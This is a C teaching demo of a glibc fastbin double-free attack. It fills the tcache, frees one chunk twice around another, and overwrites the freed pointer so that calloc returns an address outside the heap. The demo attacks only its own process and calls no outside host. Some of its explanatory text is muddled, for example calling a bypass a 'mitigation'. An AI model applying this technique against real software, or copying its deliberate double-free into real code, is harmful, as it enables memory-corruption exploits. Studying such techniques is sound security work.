#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <assert.h>


unsigned long target = 0x21;

int main(int argc, char **argv){
	unsigned long *a[7];
	
	system("clear");
	puts("\t\t\t\t[ Double Free Attack ]");
	puts("\t\t\t\t----------------------");	
	puts("- The Double Free attack this is an attack that is still present in modern libc version without actual patches or \"checks\".");
	puts("- To check for a double free in fastbins, malloc checks at the head of the bins linked list. If that pointer is the same as");
	puts("the pointer that is being freed(). Therefore this throws an error.");
	puts("- Therefore the only way to mitigate this is to free a pointer, then a different pointer then the same pointer and boom \0/");
	puts("a Double Free bug\n");
	puts("In this demo we will use the Double Free bug to trick malloc to allocate a chunk outside of the heap. Therefore this is basically");
	puts("using a Double Free Vulnerability to trigger a FastBin Attack =)");
	for(int i = 0;i < 7;i++){
		a[i] = (unsigned long *) malloc(0x10); // This is used to allocate 7 chunks.
	}

	unsigned long *b, *c, *d;
	
	
	b = (unsigned long *) malloc(0x10);
	c = (unsigned long *) malloc(0x10);
	
	puts("\n- We first allocate 9 chunks and free them to fill up the tcache and remain with 2 chunks in the fastbin.");
	for(int j = 0;j < 7;j++){
		free(a[j]); // This is used to fill up the tcache.
	}
	fprintf(stderr, "- The fastbin chunks allocated:\n\tChunk(b):[%p]\n\tChunk(c):[%p]\n", b, c);
	fprintf(stderr, "\n- We then free the chunks to add then into their fastbins. But there is something that we do different\n");
	fprintf(stderr, " we free chunk(b) this is then followed by chunk(c) and finally we free chunk(b) again leading to a double free =)\n\n");

	free(b); // They are addded  into FastBins =)
	free(c); 
	free(b); // This is where the double free happens. The chunk(b) is freed 2 times =).
	/* This will therefore be the pointer in the head of the linked list =)*/
	
	fprintf(stderr, "- Lets ask malloc() for a pointer and call that chunk(d)\n");
	d = (unsigned long *) calloc(1, 0x10);
	fprintf(stderr, "- Therefore malloc will return chunk(b)[%p] == chunk(d)[%p]. The pointer in the head of the linked list\n", b, d);
	puts("- Thus when we edit the contents of chunk(d). This will therefore affect the chunk still in the fastbin that we freed() twice\n");
	
	*d = (unsigned long) (char *)&target - 0x8;
	
	for(int i = 0;i < 2;i++){
		calloc(0x1, 0x10); // This is a loop to eliminate the 2 chunks in the fastbin
	}

	fprintf(stderr, "- The address malloc() is suppose to return: %p\n", (char *)&target + 0x8);	
	fprintf(stderr, "- The address returned by malloc is: %p\n", calloc(0x1, 0x10));
	return 0;
}
